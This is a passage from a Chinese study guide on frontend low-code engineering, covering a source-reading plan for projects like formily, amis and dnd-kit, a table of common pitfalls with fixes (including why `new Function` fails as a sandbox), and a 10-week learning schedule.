**对标项目的正确打开方式**：**Excel/WPS 公式栏**是交互规范（不是代码）——亲手记录它的细节：函数名自动补全的参数提示、引用变色、错误值的分类（`#REF!`/`#CYCLE!`/`#DIV/0!`），把这些映射成你的错误类型设计。开源侧读 **HyperFormula**（Handsontable 团队的公式引擎，处理数千公式的依赖图重算、范围引用、函数库组织——读它的依赖图与"范围变更后的失效传播"实现，是 7.3 表格 + 7.5 公式合流的桥梁）。Monarch 语法参考直接读 Monaco 官方 monarch 文档的示例语言；lezer 只在"公式语言要长期演进"时再上，起步阶段 Monarch 性价比最高。

---

## 8. 源码阅读地图（按难度递增）

1. **rjsf**：schema form 最易读，先看 renderer 与 ajv 校验链路
2. **react-grid-layout**：栅格布局/碰撞/compact 算法，纯逻辑好啃
3. **dnd-kit**：现代拖拽的 sensor/碰撞抽象
4. **amis**：schema 协议大全，重点看渲染器目录组织
5. **formily**：path 订阅 + reactive 性能设计
6. **lowcode-engine**：编辑器骨架、setter、协议版本
7. **grafana frontend**：panel/datasource 插件化 + 大盘状态

下面把 7 个项目逐一展开成可执行的阅读计划。通用约定：先跑起来（clone → install → 起它的 playground/storybook），带着下述问题打断点读，不做通读——通读是后期享乐，不是入门手段。

### 8.1 rjsf —— schema 表单的入门读物

- **入口在哪**：`rjsf/react-jsonschema-form` 仓库，monorepo 结构。主入口 `packages/core`（Form 组件、fields/widgets/templates 目录），校验在 `packages/validator-ajv8`，示例工程在各 `packages/playground-*`。
- **按什么顺序读**：第一步读 playground 里最小 schema 的渲染结果；第二步进 Form 组件的渲染函数，看它如何把 JSON Schema 递归拆成 field 树（对象 → ObjectField → 每个属性一个 Field）；第三步看 `getDefaultRegistry`——fields/widgets/templates 三张注册表如何拼装；第四步追校验链路：提交 → `validateFormData`（ajv 编译 schema 出错误列表）→ ajv 错误如何被转换成按 `props.errorSchema` 组织的、挂在字段路径上的错误对象。
- **带着什么问题读**：一个 `properties.foo` 是怎么变成一个输入组件的？ajv 的错误（JSON Pointer 形如 `/foo/bar`）怎么映射回具体字段的？我要换掉某个字段的渲染，扩展点是哪个？
- **预期读到什么**："registry + 递归 + 错误按路径归集"三件套的工程化范本。它代码量小、类型清楚，是验证你第 2 章 mini formily 设计的第一面镜子——读完你会明确看到自己缺的是 templates 抽象（布局与逻辑分离）。

### 8.2 react-grid-layout —— 纯算法好啃的布局库

- **入口在哪**：`react-grid-layout` 仓库非 monorepo，核心就三个文件：`lib/GridLayout.jsx`（容器与 reconcile）、`lib/GridItem.jsx`（单个格子的拖拽生命周期）、`lib/utils.js`（全部纯算法）。测试目录的用例就是算法的行为文档。
- **按什么顺序读**：先读 `utils.js`：`compact`（垂直压实）、`correctBounds`（越界回正）、`sortLayoutItemsByRowCol`（排序决定谁先占位）——每个都是输入输出明确的纯函数，配合测试用例读。再读 GridItem 的拖拽回调：拖动 x 像素怎么换算成列偏移、什么时候触发 re-layout。最后读 GridLayout 如何把新 layout 通过 `onLayoutChange` 抛给你。
- **带着什么问题读**：拖动时碰撞怎么解（被挡的让位还是挡回去）？`verticalCompact` 关掉后行为差在哪？为什么它要求 key 用 `layout[i].i` 而不是 index（对照第 1 章 key 铁律）？
- **预期读到什么**：第 4 章你用过的 layout model `{i,x,y,w,h}` 背后的完整算法世界。这是 7 个项目里唯一"能读完"的，适合建立"读源码是有产出的"的信心。

### 8.3 dnd-kit —— 现代拖拽的抽象设计

- **入口在哪**：`clauderic/dnd-kit` monorepo。`packages/core/src/components/DndContext` 是心脏；传感器在 `packages/core/src/sensors/`（pointer/mouse/touch/keyboard 各一个目录）；碰撞算法在 `packages/core/src/collision/`（closestCenter、closestCorners、pointerWithin、rectIntersection 各自独立成文件）；排序逻辑在 `packages/sortable/`。
- **按什么顺序读**：先读 DndContext 提供的 context 值结构（活跃拖拽、碰撞结果、悬停目标都挂在上面）；再挑 PointerSensor 读一个传感器的完整生命周期（activation constraint 怎么区分点击与拖拽）；然后把四个碰撞算法各读一遍（都很短，差异只在"怎么算距离/包含"）；最后读 `useSortable` 如何用 `useDroppable + useDraggable` 组合出排序语义。
- **带着什么问题读**：为什么传感器是插件而不是事件监听写死？DragOverlay 为什么能让拖动流畅（它绕过了什么）？嵌套 droppable 时碰撞算法的组合如何生效（对照第 3 章你踩过的坑）？
- **预期读到什么**：第 1/3 章使用它的黑盒打开——你会理解"sensor 抽象 + 碰撞策略注入"是所有拖拽基础设施的通用形，之后读任何 DnD 库（包括原生 HTML5 DnD 封装）都是同一张地图。

### 8.4 amis —— schema 协议的大词典

- **入口在哪**：`baidu/amis` monorepo。渲染器注册机制在 `packages/amis-core/src/factories.ts`（`registerRenderer` 与 `Renderer` 装饰器）；具体渲染器在 `packages/amis/src/renderers/`（按类型分目录：Form/ 下是表单家族、CRUD、Table、图表……）；动作系统在 `packages/amis-core/src/actions/`；类型定义搜 `packages/amis-core/src` 里的 Schema 相关文件。
- **按什么顺序读**：先跑官方文档的示例页，找一个最简 `type: 'page'` schema；然后从它的 render 入口断点跟进去：字符串 type → 查渲染器注册表 → 实例化 → 递归处理子 schema。接着横向读目录组织：挑 `renderers/Form` 精读一个（如 InputText），看 props 如何从 schema 映射、表达式（`${}`）在哪里求值。最后读 actions 目录的内置动作清单，对照第 6 章你的 action registry。
- **带着什么问题读**：它的 schema 有多少顶层域（type/props/visible/hidden/onEvent/api/expression）？组件如何声明自己支持哪些事件与动作？渲染器之间如何做作用域传递（表单数据怎么流到子项）？
- **预期读到什么**：一份"协议该有哪些词汇"的完整答案。第 6 章产出后读它事半功倍——每读一个域就对照"我的协议有没有这层、为什么"。

### 8.5 formily —— 性能设计的深水区

- **入口在哪**：`alibaba/formily` monorepo。数据模型在 `packages/core/src/models/`（Form/Field/ArrayField 各一文件）；响应式内核在 `packages/reactive/`（依赖收集/autorun/batch）；React 绑定在 `packages/reactive-react/`（observer）与 `packages/react/src/components/`（Field/FormConsumer 等）。
- **按什么顺序读**：先读 `packages/reactive` 的 autorun：函数执行时访问了哪些 observable 属性、如何登记订阅、再变更如何精确触发重跑。然后读 Field 模型：path 如何寻址、value 校验状态如何聚合到 Form。最后读 React 侧 observer 如何把"依赖收集"变成"组件级精准重渲染"。
- **带着什么问题读**：为什么 formily 的字段组件天然只在自己值变化时重渲染（对照你第 2 章 path selector 手工实现的东西）？batch 把多次变更合并成一次渲染是怎么做到的？
- **预期读到什么**：第 2 章"path 级订阅"的工业化版本——响应式代理替代手写 selector，依赖自动收集替代手工声明。读不懂的部分留到二刷，带着你已实现过的简化版对照，理解成本会指数下降。

### 8.6 lowcode-engine —— 编辑器工程化标准

- **入口在哪**：`alibaba/lowcode-engine` monorepo。主包 `packages/engine`：设计器在 `src/designer`（拖拽、投放位置计算、hover/highlight）、文档模型在 `src/document`（节点树操作 API）、面板骨架在 `src/skeleton`（注册面板/工具栏插件位）、setter 体系与物料协议相关代码同仓；仓库根 `specs/` 目录是《中后台搭建协议规范》的规范文档与 JSON Schema。
- **按什么顺序读**：先读 `specs/` 的协议规范文档（它是中文、成体系，半天能通读）；再进 `src/designer` 看一次"从物料面板拖入画布"的事件流；然后看 skeleton 如何让插件把面板注册进各个插槽；最后对照内置 setter 列表与第 6 章你的 Setter 体系。
- **带着什么问题读**：它的画布/宿主如何划分（对照你的 iframe 方案）？协议里 version 与规范治理怎么做的（对照你的 migration 链）？setter 的元信息协议长什么样（对照你的 configSchema）？
- **预期读到什么**："编辑器是一个由插件拼装的系统"这个工程观，以及协议规范的治理范本。它体量大，务必只按问题跳读。

### 8.7 grafana frontend —— 插件化的超大样本

- **入口在哪**：`grafana/grafana` 仓库前端主目录 `public/app`（以仓库当前结构为准）。panel 插件在 `public/app/plugins/panel/`（每个面板一个目录：`module.tsx` + `plugin.json`），datasource 插件在 `public/app/plugins/datasource/`，大盘状态传统上在 `public/app/features/dashboard/`，新一代 Scenes 架构在 `public/app/features/scenes/`。
- **按什么顺序读**：先读一个最简单 panel 插件（如 stat/table）的 `module.tsx` 与 `plugin.json`——看"一个插件要声明什么、被谁加载"；再读 datasource 插件的 query 接口形状（对照第 4 章你的 `DataSource` 抽象）；然后挑 dashboard 状态管理读"dashboard JSON → 内存模型 → 面板查询调度"的链路；有余力再看 Scenes 如何把大盘组织成可嵌套的 scene 树。
- **带着什么问题读**：panel 与 datasource 是怎么解耦的（面板如何做到"对任何数据源都工作"）？插件的生命周期（加载/禁用/升级）谁管？大盘的自动刷新与时间范围如何分发到每个面板（对照第 4 章）？
- **预期读到什么**：第 4 章思想的十万行级放大——你会在真实工业强度下看到注册表、插件元信息、数据源抽象如何撑起一个生态，以及"协议先行"在多人协作里意味着什么。

### 8.8 通用读法：一条链路读法 + issue 驱动读法

读法：从渲染入口顺着一条 schema 的处理链路读到副作用出口；带着一个具体 issue 去读效率最高。

这句话展开成两套可执行的方法论。

**方法一：一条 schema 处理链路读法（纵向）**。步骤固定五步：

1. **准备一个最小输入**。手写/官方示例里挑一份 10 行以内的 schema，它能跑出可见输出。没有最小输入的阅读是空中楼阁——你在读的是"想象中的数据怎么流"。
2. **锚定渲染入口**。搜索"schema 进来的第一个函数"：amis 的 render、rjsf 的 Form、你自己的 `mountRenderer`。在这里打上第一个断点。
3. **顺着一条链走，不做分叉**。每一步只回答"当前函数对这份输入做了什么、产出了什么给下一个函数"——遇到与当前 schema 无关的分支（其他组件类型、其他事件）直接跳过。建议开一个笔记文件记调用链：`render → resolveRenderer(type) → createReactComponent → props 映射 → 子 schema 递归 → …`。
4. **走到副作用出口为止**。链路的终点必是三类副作用之一：DOM/组件渲染、网络请求、状态写入。把出口记下来，这条链就闭环了。
5. **合上源码画图复述**。凭笔记把链路画成一张流程图，画不出来的地方就是你没真懂的地方，回去补。第二天再默画一次，能默画 = 这条链属于你了。

这套方法的价值在于**边界克制**：一个库有几百条链路，你只需要读通 1–2 条主干就获得了它的"世界观"，剩下的按需再钻。

**方法二：issue 驱动读法（问题驱动）**。步骤四步：

1. **选一个真问题**。去仓库 issue 列表按 `good first issue` 或你实际遇到的 bug/疑惑挑一个（例如"嵌套 droppable 命中不对"）。真问题给了你"带着什么读"的答案，比抽象的"学习源码"有效一个数量级。
2. **本地复现**。clone + 起它的 playground/storybook，把 issue 的最小复现做出来。复现不了就换一个 issue——复现是硬门槛。
3. **从行为反推代码**。你已经会用调试器（方法一练过），从"表现不对的那一行 UI"反向打断点、看调用栈，定位到产生行为的代码区域。这个区域通常只有两三个文件。
4. **对照官方修复**。试着改；再看 maintainer 的 fix commit / PR diff，对比他改了哪里、为什么那里而不是你改的地方。差异点就是你对架构理解的盲区。即使不提 PR，"我的补丁 vs 官方补丁"的 diff 也是最高浓度的架构课。

两个方法的关系：链路读法建立地图，issue 驱动定位深钻。只用前者容易"读过就忘"，只用后者容易"只见树木"。建议节奏：每读一个新库，先花半天跑链路法，之后全部用 issue 驱动。

---

## 9. 高频难点速查表

| 症状 | 根因 | 解法 |
|---|---|---|
| 输入一个字符全表/整页重渲染 | 全量受控 state | path 级 selector 订阅 + Node memo |
| Cmd+Z 逐字符回退 | 补丁未合并 | immer patch 防抖合并 |
| 拖进嵌套容器判定错乱 | 碰撞策略单一 | pointerWithin + closestCorners 组合 |
| 拖动时源位置布局跳动 | 原元素被修改 | DragOverlay 替身渲染 |
| monaco 光标跳动/撤销栈丢失 | 受控 setValue | 非受控 model 模式 |
| 编辑态点击触发了组件自身行为 | 事件穿透 | 编辑模式 pointer-events:none + capture 拦截 |
| 联动/事件死循环 | 循环依赖 | 单轮求值限制/依赖图/动作深度上限 |
| 面板高频刷新卡顿 | 全量 setOption + 大数据 | 数据抽样、增量更新、visibilitychange 暂停 |
| 旧 schema 页面白屏 | 协议无版本 | 协议 version + migration 链 |
| 用户自定义 JS 拿到全局对象 | new Function 并不隔离 | iframe sandbox / quickjs |

表格保留如上。下面每行展开机制解释——为什么这个根因导致这个症状、解法背后的原理——让这张表脱离上下文也能独立读懂。

**行 1（输入一个字符全表重渲）**：机制链条是"全量受控 state → 每次击键 setState 在表单根部 → 根组件重渲染 → 所有子组件因父级重渲染而重渲染（没有 memo 时 React 默认全量向下）"。50 个字段里 49 个的 props 其实没变，但 React 不知道——它只比对新旧 props 引用，而根 state 变化制造了全新的 props 对象树。解法原理：path 级 selector 让每个字段组件用 `useStore(s => s.form[path])` 只订阅自己的值切片，zustand 用引用比较判定切片没变就跳过该组件的重渲染；Node 组件再包 `memo`，把"父级树更新"的传导也挡住。两层防线各挡一个传染路径（state 订阅路径与父级 props 路径）。

**行 2（Cmd+Z 逐字符回退）**：机制是"每次击键产生一个独立的 immer patch（如 `{op:'replace', path:['form','name'], value:'张三明'}`）→ 每个补丁单独进 undo 栈 → Cmd+Z 一次弹一个补丁 = 撤一个字符"。补丁本身没有错，错在**粒度**：用户心智里"输入完这句话"是一个操作，但系统记成了 N 个操作。解法原理：对同一 `path` 的连续 value 替换补丁做防抖合并（如 300ms 窗口）——相邻补丁互为逆操作，合并时保留窗口首的旧值与窗口尾的新值，中间值全部丢弃，语义上等价于"一次输入"。

**行 3（嵌套容器拖放判定错乱）**：机制是"单一 closestCenter 策略只算拖拽中心到各 droppable 中心的距离 → 嵌套场景里外层容器与内层容器的中心可能离指针更近的是外层（内层很小/指针在内层边缘）→ 拖进小容器被判定进大容器"。几何上"中心距离"无法表达"指针在谁里面"这个语义。解法原理：pointerWithin 先回答"指针落在哪些 droppable 的矩形内"（包含关系无歧义），有唯一命中直接用；没有命中（指针在容器间隙）再退回 closestCorners 按四角距离选最近者。两段策略把"包含优先、距离兜底"变成算法，与人对拖放的直觉一致。

**行 4（拖动时布局跳动）**：机制是"拖起的元素若被设为 `position: absolute` 或 `display: none`，它会脱离/离开文档流 → 兄弟元素回流补位 → 画布整体塌一下；后续每帧拖动又触发重排"。dnd-kit 不移动原元素（只加 transform），但 sortable 圍绕原位的位移动画若与你的布局冲突同样会闪。解法原理：DragOverlay 把"视觉替身"渲染到 `position: fixed` 的传送门层，完全脱离文档流随指针移动；原元素留在原地（或保持占位尺寸），布局零回流。视觉与布局解耦后，拖动期间的重排次数从 O(帧数) 降到 0。

**行 5（monaco 光标跳动/撤销栈丢失）**：机制是"受控模式下每次 React 渲染都调用 `editor.setValue(newValue)` → setValue 是一次'全文档替换编辑'：光标被重置到文档头/尾，撤销栈里被压入整段替换 → 用户按一次 Cmd+Z 撤回的不是自己的编辑而是那次 setValue → 撤销栈瞬间被污染"。解法原理：非受控 model 模式——编辑器自己持有 model 作为唯一事实源，React 只在"外部数据真的变了"（如导入 JSON）时用 `executeEdits` 做一次带精确 range 的编辑（它是一条普通编辑，光标与撤销栈语义都正确），日常输入完全由 model 内部消化，React 侧只读不写。

**行 6（编辑态点击触发组件自身行为）**：机制是"画布里的业务组件（按钮/链接/视频）注册了自己的 onClick/onPlay → React 合成事件沿组件树冒泡 → 目标组件自己的 handler 先于/独立于画布的选中逻辑执行 → 点'删除按钮'真的触发了删除接口"。编辑器要的是"点击=选中"，组件要的是"点击=干活"，两者对同一事件有冲突的诉求。解法原理分两层：`pointer-events: none` 让组件根本不成为事件目标（点击命中的是画布容器/包裹层，天然只剩选中语义）；对必须接收事件定位的场景（如需要在 iframe 或第三方组件上命中），在 capture 阶段（事件到达目标前）`stopPropagation`，让组件的 handler 收不到事件。前者"物理隔离"，后者"拦截"，优先用前者。

**行 7（联动/事件死循环）**：机制是"联动表达式或事件动作构成环：A 依赖/触发 B、B 依赖/触发 A → 每次变更重新点燃对方 → 求值或动作无限自激"。三种解法对应三层精确度：单轮求值限制（每轮渲染/每次触发只求值一遍，第二轮的变更留到下一轮——简单但可能"该联动的不联动"）、依赖图（静态解析表达式/动作的引用关系建图，保存时检测环——最精确，但动态引用覆盖不全，见第 6 章路线 6 的完整讨论）、动作深度上限（运行时递归深度熔断——兜底一切静态分析漏掉的动态环）。三者的关系是递进兜底而非三选一。

**行 8（面板高频刷新卡顿）**：机制是"每次 tick 都对 echarts 全量 `setOption`（携全量新数组）→ echarts 对所有序列重新 diff、重新布局坐标轴与图例 → 数据点上千时每次都是几十毫秒级的 JS + 渲染开销 → 5s 刷新一屏 20 个面板 = 主线程常年被占"。三个解法各断一根传导路径：数据抽样/downsampling 把"传给 echarts 的点数"从源头砍掉（图表视觉密度有上限，超出就是浪费）；增量更新（追加新点而非整包替换）让 echarts 走 append 路径避免全量 re-layout；visibilitychange 暂停把"页面不可见时依然在烧 CPU"这条最冤的路径直接掐断——setInterval 在后台标签页里仍会执行（只是被浏览器降频到最低 1 次/秒），不主动停就永远在烧。

**行 9（旧 schema 白屏）**：机制是"协议无版本号 → 平台升级后渲染器按新协议解释旧 JSON → 读到不存在的字段/结构时抛 TypeError → React 组件树自底向上卸载 → 白屏"。数据与代码的版本错配没有任何运行时保护。解法原理：version 字段让数据自述版本；migration 链把任意旧版本逐级升级到当前版本（每级一个纯函数，可测试、可回溯），渲染器永远只面对"当前版本"一种输入——错配在入口处被消化，而不是在渲染深处爆炸。配套兜底：未知 type 渲染占位组件 + Error Boundary，保证未及迁移的页面降级可打开（第 6 章路线 9）。

**行 10（自定义 JS 拿到全局对象）**：机制是"`new Function` 创建的函数永远运行在**当前领域**的全局作用域里，且 JS 的对象引用图（`obj.constructor.constructor` → Function 构造器）从任何内建对象都能走回全局——'遮蔽变量名'式的沙箱只是把名字藏起来，引用图没断"（第 6 章路线 7 的两行逃逸代码可现场复现）。解法原理是领域隔离：iframe `sandbox="allow-scripts"`（不给 allow-same-origin）给脚本一个 opaque origin 的独立全局与原型链，读宿主 cookie/DOM 直接抛 SecurityError；quickjs-emscripten 更进一步——独立 WASM 解释器，全局对象完全由宿主注入，没有"藏"只有"给"。两者的共同本质：不是挡住路，而是换了一个世界。

---

## 10. 节奏安排（10 周）

| 周 | 内容 | 里程碑 |
|---|---|---|
| 1–2 | 底座 + Schema 动态表单 | mini formily（性能达标） |
| 3–4 | 表单设计器 | 设计器↔渲染器闭环 |
| 5–6 | 拖拽仪表盘 | dashboard JSON 进出 |
| 7 | JSON 编辑器 | 可视化/源码双入口 |
| 8–10 | 低代码整合 | mini 低代码平台发布 |

表格不动。要展开的是每个场景内部的**章内节奏**——同一套循环要在 10 周里跑 5 遍，跑得越标准，产出越扎实。

### 10.1 每章节奏公式：协议设计（半天）→ 按路线逐步实现（主体）→ 对照对标开源校验设计 → 写一篇复盘

每章节奏：**协议设计（半天）→ 按路线逐步实现（主体）→ 对照对标开源校验设计 → 写一篇复盘**。
复盘必须回答：我的协议和 formily/amis 的差距在哪？哪里的性能没做 path 订阅？

这两行是全篇的总纲，逐段拆成可执行的操作说明。

**第一段：协议设计（半天）怎么过**。半天 = 4 小时，切成四块，每块有明确产出物：

1. **第 1 小时：写 TS 类型，不写实现**。把本章实体的节点/字段/配置全部写成 discriminated union 与 interface（第 1 章 1.1 的方法）。硬性纪律：类型里不允许出现 `any`；枚举值穷举（`type: 'input' | 'select' | ...`）。类型写不顺 = 协议没想清，此时写代码必返工。
2. **第 2 小时：手写样例数据**。3 份合法 JSON（简单/典型/边界各一）+ 2 份非法 JSON（故意缺字段、错误枚举）。合法样例之后就是你的开发与测试夹具；非法样例用来验证 TS 报错信息是否能指引排错。手写 JSON 时会发现类型里没定义的隐含约束（比如"数组字段必有 itemSchema"），当场回改类型。
3. **第 3 小时：画数据流图**。一张图三个角色（编辑器/协议/渲染器），箭头标"谁产出、谁消费、何时求值"。第 6 章开头的架构图就是这一步的成品形态。图里每一个箭头都要能回答"同步还是异步、单向还是双向"。
4. **第 4 小时：写"协议十问"文档**。十个问题写进 README：key 用什么？隐藏字段的值保不保留？表达式什么时候求值？version 从几开始？未知 type 怎么办？……能答的直接写答案，不能答的标"待实现期验证"。这份文档是第四段复盘的对照组。

**第二段：按路线逐步实现（主体）怎么排**。操作规则五条：

1. **路线即顺序**：每章"实现路线"的编号就是依赖顺序，不要跳步——第 6 章不先做协议升级就做 EventSetter，setter 产出的数据无处安放，必然返工。
2. **每条路线以"可演示"收尾**：一条路线完成的定义是能对别人演示它的效果（路线 2 完成 = 拖组件进 iframe 画布落点正确），不是"代码写完了"。演示不出来的路线等于没做完。
3. **坑即测试**：每个 ⚠️ 坑位在修完后写一个最小复现测试（构造该 schema/操作序列，断言修复行为）。坑是免费的测试用例设计书。
4. **时间盒**：单条路线卡住超过预计 2 倍时间，先做一个能跑的简化版跳过去，在复盘里记录欠账——进度比完美重要，欠账清单防止遗忘。
5. **每周一次"组装日"**：把当周产物与前几章接起来跑一遍（如第 7 周把 JSON 编辑器接进第 3/4 章的导入导出）。集成问题暴露得越频繁，最终整合周（8–10 周）越轻松。

**第三段：对照对标开源校验设计怎么操作**。不是"通读源码"，是三个固定动作：

1. **字段级对照**：打开对标项目的协议定义（formily 的 JSON Schema 映射、amis 的 Schema 类型/文档），把它的顶层域列成清单（type/props/visible/hidden/onEvent/api/…），逐项问"我的协议有吗？没有是没想到还是故意不要？"。故意不要的写进 README 的设计决策一节（例如"我不做 xxx 因为场景不需要"），想到但没做的进欠账清单。
2. **机制级对照**：挑一个你刚实现完的机制（如 path 订阅、动作链），去看对标项目的同一机制（formily 的 autorun、amis 的 actions），对比触发时机、批量合并、错误处理三个维度。差异点写进复盘——通常你会发现对方多做了"批量/边界/降级"中的一项。
3. **issue 抽查**：在对标仓库搜你踩过的坑关键词（如 undo input、nested droppable），看它是否也踩过、怎么修的。这是第 8 章"issue 驱动读法"的日常化。

**第四段：写一篇复盘，两个必答题怎么对照着答**。复盘文章结构固定：协议终稿（类型 + 一份典型 JSON）、架构图、三个最深的坑（症状/根因/修法）、与对标的三处差异、欠账清单。两个必答题的答法：

1. **"我的协议和 formily/amis 的差距在哪？"**——用第三段的字段级对照清单直接回答：列出"它有我没有"的每一项，标注"没想到 / 想到故意不要 / 想到没做"。这份清单本身就是差距的完整刻画，避免"感觉差挺多"式的空话。重点解释"故意不要"的项——那是你的协议与它们的场景差异所在，也是面试时讲得最出彩的部分。
2. **"哪里的性能没做 path 订阅？"**——不是凭记忆回答，用 Profiler 走一遍：打开第 2 章产出的 20 字段表单（或本章页面），在任一输入框打字，看 Profiler 的 commit 火焰图——重渲染组件数应为 1；再打开第 6 章页面改一个变量，记录受影响组件数与理论值（只应影响绑定该变量的组件）。凡"实际 > 理论"的位置逐个归因：漏了 selector？依赖收集没覆盖该表达式？还是 memo 被 props 内联对象击穿？每个归因写一行修法。两个场景都测过且数字达标，这题才算答完——这也是表格里"性能达标"里程碑的验收动作。

这套"协议 → 实现 → 对照 → 复盘"的循环跑满 10 周，你收获的不只是五个项目，而是一套可复用的方法论：拿到任何"描述型 UI/流程"需求，先设计协议、再搭注册表与递归渲染、用对照开源校验决策、以复盘沉淀判断力——这正是从"会用 React"到"能定义系统"的那一步。
